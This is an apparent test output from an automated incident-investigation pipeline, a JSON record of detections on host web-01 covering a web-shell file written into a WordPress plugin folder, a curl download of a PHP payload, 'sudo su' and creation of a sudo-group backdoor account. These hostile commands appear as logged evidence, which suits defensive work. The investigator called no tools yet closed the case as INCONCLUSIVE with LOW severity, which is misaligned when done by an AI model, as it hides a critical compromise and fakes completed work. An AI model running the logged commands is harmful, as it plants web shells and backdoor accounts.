@@ -1,0 +1,227 @@
+{
+  "incident_id": "INC-7d29ffde",
+  "investigation_id": "INV-INC-7d29ffde-20260927-001",
+  "investigation_status": "COMPLETE",
+  "timestamp": "2026-09-27T11:57:08Z",
+  "initial_seed": {
+    "incident_id": "INC-7d29ffde",
+    "host": "web-01",
+    "src_ip": null,
+    "window": [
+      "2026-09-14T23:45:10.122Z",
+      "2026-09-14T23:50:02.015Z"
+    ],
+    "trigger_time": "2026-09-14T23:45:10.122Z",
+    "evidence_refs": [
+      "sample_audit.log:6",
+      "sample_audit.log:11",
+      "sample_audit.log:16",
+      "sample_auth.log:5",
+      "sample_audit.log:21"
+    ],
+    "trigger_description": "Web Process Writes Executable Script Into Webroot / Web Process Executes Reconnaissance/Exploitation Command Without Interactive Session / Web Process Attempts Privilege Escalation / Login-Capable Account Created Or Login Shell Enabled / Account Creation or Cron Modification Without Interactive Session",
+    "severity_hint": "CRITICAL",
+    "detection": {
+      "entity": {
+        "type": "pid",
+        "value": "1200"
+      },
+      "layers": [
+        "auth",
+        "system"
+      ],
+      "member_count": 5,
+      "oversized": false,
+      "join_types": {
+        "audit_lineage": 3,
+        "system_auth": 1
+      },
+      "rules": [
+        {
+          "rule_name": "audit_webroot_php_write",
+          "reason": "Web Process Writes Executable Script Into Webroot",
+          "layer": "system",
+          "severity": "high",
+          "evidence_refs": [
+            "sample_audit.log:6"
+          ],
+          "detail": {
+            "timestamp": "2026-09-14T23:45:10.122Z",
+            "pid": 1200,
+            "ppid": 1000,
+            "uid": 33,
+            "user": "www-data",
+            "comm": "php-fpm8.1",
+            "exe": "/usr/sbin/php-fpm8.1",
+            "path": "/var/www/html/wp-content/plugins/cache-optimizer-a5d5/is.php",
+            "cwd": "/"
+          }
+        },
+        {
+          "rule_name": "audit_webshell_recon",
+          "reason": "Web Process Executes Reconnaissance/Exploitation Command Without Interactive Session",
+          "layer": "system",
+          "severity": "critical",
+          "evidence_refs": [
+            "sample_audit.log:11"
+          ],
+          "detail": {
+            "timestamp": "2026-09-14T23:45:12.300Z",
+            "pid": 5310,
+            "ppid": 1200,
+            "uid": 33,
+            "user": "www-data",
+            "comm": "sh",
+            "exe": "/usr/bin/dash",
+            "exec_args": "sh -c curl -s https://raw.githubusercontent.com/example/repo/main/123.php -o is.php",
+            "path": "/usr/bin/dash",
+            "cwd": "/var/www/html/wp-content/plugins/cache-optimizer-a5d5"
+          }
+        },
+        {
+          "rule_name": "audit_web_priv_esc",
+          "reason": "Web Process Attempts Privilege Escalation",
+          "layer": "system",
+          "severity": "critical",
+          "evidence_refs": [
+            "sample_audit.log:16"
+          ],
+          "detail": {
+            "timestamp": "2026-09-14T23:49:30.700Z",
+            "pid": 5320,
+            "ppid": 1200,
+            "uid": 33,
+            "user": "www-data",
+            "comm": "sudo",
+            "exe": "/usr/bin/sudo",
+            "exec_args": "sudo su",
+            "path": "/usr/bin/sudo",
+            "cwd": "/var/www/html/wp-content/plugins/cache-optimizer-a5d5"
+          }
+        },
+        {
+          "rule_name": "audit_webshell_recon",
+          "reason": "Web Process Executes Reconnaissance/Exploitation Command Without Interactive Session",
+          "layer": "system",
+          "severity": "critical",
+          "evidence_refs": [
+            "sample_audit.log:16"
+          ],
+          "detail": {
+            "timestamp": "2026-09-14T23:49:30.700Z",
+            "pid": 5320,
+            "ppid": 1200,
+            "uid": 33,
+            "user": "www-data",
+            "comm": "sudo",
+            "exe": "/usr/bin/sudo",
+            "exec_args": "sudo su",
+            "path": "/usr/bin/sudo",
+            "cwd": "/var/www/html/wp-content/plugins/cache-optimizer-a5d5"
+          }
+        },
+        {
+          "rule_name": "auth_login_account_created",
+          "reason": "Login-Capable Account Created Or Login Shell Enabled",
+          "layer": "auth",
+          "severity": "high",
+          "evidence_refs": [
+            "sample_auth.log:5"
+          ],
+          "detail": {
+            "timestamp": "2026-09-14T23:50:02.000Z",
+            "pid": 5501,
+            "ppid": null,
+            "uid": 1002,
+            "user": "svcbackup",
+            "event": "user_created"
+          }
+        },
+        {
+          "rule_name": "audit_persistence_account_cron",
+          "reason": "Account Creation or Cron Modification Without Interactive Session",
+          "layer": "system",
+          "severity": "high",
+          "evidence_refs": [
+            "sample_audit.log:21"
+          ],
+          "detail": {
+            "timestamp": "2026-09-14T23:50:02.015Z",
+            "pid": 5501,
+            "ppid": 5320,
+            "uid": 0,
+            "user": "root",
+            "comm": "useradd",
+            "exe": "/usr/sbin/useradd",
+            "exec_args": "useradd -m -G sudo svcbackup",
+            "path": "/usr/sbin/useradd",
+            "cwd": "/root"
+          }
+        }
+      ]
+    }
+  },
+  "raw_refs": [
+    "sample_audit.log:6",
+    "sample_audit.log:11",
+    "sample_audit.log:16",
+    "sample_auth.log:5",
+    "sample_audit.log:21"
+  ],
+  "raw_ref_locations": {},
+  "provenance": {
+    "status": "passed",
+    "raw_ref_count": 5,
+    "seed_raw_refs": [
+      "sample_audit.log:6",
+      "sample_audit.log:11",
+      "sample_audit.log:16",
+      "sample_auth.log:5",
+      "sample_audit.log:21"
+    ],
+    "evidence_without_raw_refs": [],
+    "empty_result_evidence": [],
+    "ambiguous_raw_refs": {},
+    "issues": []
+  },
+  "hypothesis": {
+    "title": null,
+    "description": null,
+    "confidence_initial": 0.5
+  },
+  "evidence_chain": [],
+  "contradicting_evidence": [],
+  "attack_timeline": [],
+  "confidence_progression": [
+    {
+      "stage": "initial",
+      "confidence": 0.5,
+      "reason": "Web Process Writes Executable Script Into Webroot / Web Process Executes Reconnaissance/Exploitation Command Without Interactive Session / Web Process Attempts Privilege Escalation / Login-Capable Account Created Or Login Shell Enabled / Account Creation or Cron Modification Without Interactive Session"
+    }
+  ],
+  "final_verdict": {
+    "verdict": "INCONCLUSIVE",
+    "confidence": 0.5,
+    "severity": "LOW",
+    "attack_type": "unknown",
+    "affected_systems": [],
+    "summary": "테스트용 즉시 종료",
+    "reasoning": "판단 근거가 명시적으로 제공되지 않았습니다."
+  },
+  "tools_called": [],
+  "statistics": {
+    "tool_calls_count": 0,
+    "tool_calls_max": 8,
+    "confidence_increase": 0.0,
+    "investigation_confidence": 0.5,
+    "evidence_count": 0,
+    "contradicting_evidence_count": 0,
+    "termination_reason": "no_more_evidence"
+  },
+  "remaining_unknowns": [],
+  "investigation_notes": [
+    "종료 관문 발동 — 종료 거부: 도구를 0종류만 직접 확인하고 no_more_evidence로 종료하려 함. 아직 확인하지 않은 도구 중 사건과 관련된 것을 최소 1회 호출하십시오 — fetch_audit_log: 서버에서 실행된 명령·파일 변경(웹 서버 프로세스 www-data/apache2의 셸·다운로드 실행, 로그인 세션의 명령) — 공격이 서버 안까지 이어졌는지 확인 / fetch_auth_log: 같은 IP·계정의 로그인 시도와 성공 여부 / fetch_web_log: 같은 IP의 웹 요청(경로·상태코드) / fetch_network_log: 같은 IP의 외부 통신과 Suricata 경보",
+    "종료 관문 발동 — 종료 거부: 도구를 0종류만 직접 확인하고 no_more_evidence로 종료하려 함. 아직 확인하지 않은 도구 중 사건과 관련된 것을 최소 1회 호출하십시오 — fetch_audit_log: 서버에서 실행된 명령·파일 변경(웹 서버 프로세스 www-data/apache2의 셸·다운로드 실행, 로그인 세션의 명령) — 공격이 서버 안까지 이어졌는지 확인 / fetch_auth_log: 같은 IP·계정의 로그인 시도와 성공 여부 / fetch_web_log: 같은 IP의 웹 요청(경로·상태코드) / fetch_network_log: 같은 IP의 외부 통신과 Suricata 경보",
+    "연속 2회 종료 거부 후에도 진전이 없어 강제 종료 턴으로 전환합니다."
+  ]
+}
